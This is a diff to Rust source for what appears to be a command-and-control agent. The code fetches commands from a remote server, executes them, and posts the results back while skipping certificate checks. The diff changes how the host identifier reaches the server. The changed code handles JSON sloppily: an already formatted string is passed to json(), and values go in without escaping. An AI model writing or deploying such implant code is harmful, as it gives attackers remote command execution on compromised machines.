@@ -46,13 +46,13 @@ fn init_host(host_ip:&str) -> Option<String>{
 }
 
 fn get_commands(identifier:&str){
-    let commands_url = format!("{}/hosts/{}/commands",SERVER_IP,identifier);
+    let commands_url = format!("{}/hosts/commands",SERVER_IP);
 	let client = reqwest::blocking::Client::builder()
         .danger_accept_invalid_certs(true)
         .build()
         .unwrap();
-
-	let res = match client.post(commands_url).send(){
+    let text = format!("{{\"identifier\": \"{}\"}}",identifier);
+	let res = match client.post(commands_url).json(&text).send(){
         Ok(ok)=>{
             ok.text().unwrap()
         }, Err(_)=>{
@@ -163,13 +163,13 @@ fn run_command(cmd: &str) -> String {
 }
 
 fn post_response(cmd_id: &str, response: &str, identifier: &str){
-    let responses_url = format!("{}/hosts/{}/response",SERVER_IP, identifier);
+    let responses_url = format!("{}/hosts/response",SERVER_IP);
     let mut response = response;
     if response.eq("") {
         response = "Command executed. (No response)"
     }
     print(&format!("\tcmd_id: {}\n\tResponse: {}",cmd_id,response));
-    let text = format!("{{\"cmd_id\": \"{}\",\"response\": \"{}\"}}",cmd_id,response);
+    let text = format!("{{\"cmd_id\": {},\"response\": \"{}\"}}",cmd_id,response);
     let client = reqwest::blocking::Client::builder()
         .danger_accept_invalid_certs(true)
         .build()
